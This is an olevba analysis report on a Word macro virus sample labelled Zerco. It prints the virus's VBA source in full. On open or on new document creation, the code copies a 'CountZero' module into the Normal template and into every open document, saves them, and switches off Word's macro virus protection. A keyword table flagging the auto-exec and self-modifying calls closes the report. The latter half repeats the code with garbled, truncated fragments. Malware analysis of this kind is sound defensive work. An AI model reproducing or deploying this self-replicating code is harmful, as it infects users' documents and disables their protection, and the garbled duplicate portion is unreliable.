olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Zerco
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Zerco - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CountZero.bas 
in file: ./Virus.MSWord.Zerco - OLE stream: 'Macros/VBA/CountZero'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.Zerco - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
Dim vbc As VBComponent
Dim cm As CodeModule
Dim vir As CodeModule
Dim cdoc As Document
Dim vbiref As Reference
On Error Resume Next
If ThisDocument.Name <> NormalTemplate.Name Then
    Set vbc = NormalTemplate.VBProject.VBComponents("CountZero")
    If Err <> 0 Then
        For Each vbiref In ThisDocument.VBProject.References
        If vbiref.Name = "VBIDE" Then
            Exit For
        End If
        Next
        Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
        vbc.Name = "CountZero"
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
        NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
    Else
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
            For Each vbiref In ThisDocument.VBProject.References
                If vbiref.Name = "VBIDE" Then
                    Exit For
                End If
            Next
            Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
            vbc.Name = "CountZero"
            Set cm = vbc.CodeModule
            Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
            cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
            NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
        End If
    End If
End If
For Each cdoc In Documents
    Clone cdoc
    cdoc.Save
Next

Options.VirusProtection = False
Application.Activate
On Error GoTo 0
End Sub
Sub Clone(ByRef dest As Document)
Dim vbiref As Reference
Dim vbc As VBComponent
Dim cm As CodeModule
Dim vir As CodeModule
On Error Resume Next
For Each vbiref In ThisDocument.VBProject.References
    If vbiref.Name = "VBIDE" Then
        Exit For
    End If
Next
Set vbc = dest.VBProject.VBComponents("CountZero")
If Err <> 0 Then
    Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
    vbc.Name = "CountZero"
    Set cm = vbc.CodeModule
    Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
    cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
    dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
Else
    Set cm = vbc.CodeModule
    Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
    If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
        Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
        vbc.Name = "CountZero"
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
        dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
    End If
End If
End Sub
Sub AutoNew()
Dim adoc As Document
    If ThisDocument.Name = NormalTemplate.Name Then
        For Each adoc In Documents
            Clone adoc
        Next
       
       
    End If
End Sub
Sub AutoOpen(String)
Dim vbc As VBComponent
Dim cm As CodeModule
Dim vir As CodeModule
Dim cdoc As Document
Dim vbiref As Reference
On Error Resume Next
If ThisDocument.Name <> NormalTemplate.Name Then
    Set vbc = NormalTemplate.VBProject.VBComponents("CountZero")
    If Err <> 0 Then
        For Each vbiref In ThisDocument.VBProject.References
        If vbiref.Name = "VBIDE" Then
            Exit For
        End If
        Next
        Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
        vbc.Name = "CountZero"
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
        NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
    Else
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
            For Each vbiref In ThisDocument.VBProject.References
                If vbiref.Name = "VBIDE" Then
                    Exit For
                End If
            Next
            Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
            vbc.Name = "CountZero"
            Set cm = vbc.CodeModule
            Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
            cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
            NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
        End If
    End If
End If
For Each cdoc In Documents
    Clone cdoc
    cdoc.Save
Next

Options.VirusProtection = False
Application.Activate
On Error GoTo 0
End Sub


)
Dim vbiref As Reference
Dim vbc As VBComponent
Dim cm As CodeModule
Dim vir As CodeModule
On Error Resume Next
For Each vbiref In ThisDocument.VBProject.References
    If vbiref.Name = "VBIDE" Then
        Exit For
    End If
Next
Set vbc = dest.VBProject.VBComponents("CountZero")
If Err <> 0 Then
    Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
    vbc.Name = "CountZero"
    Set cm = vbc.CodeModule
    Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
    cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
    dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
Else
    Set cm = vbc.CodeModule
    Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
    If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
        Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
        vbc.Name = "CountZero"
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
        dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
    End If
End If
End Sub

()
Dim adoc As Document
    If ThisDocument.Name = NormalTemplate.Name Then
        For Each adoc In Documents
            Clone adoc
        Next
       
       
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

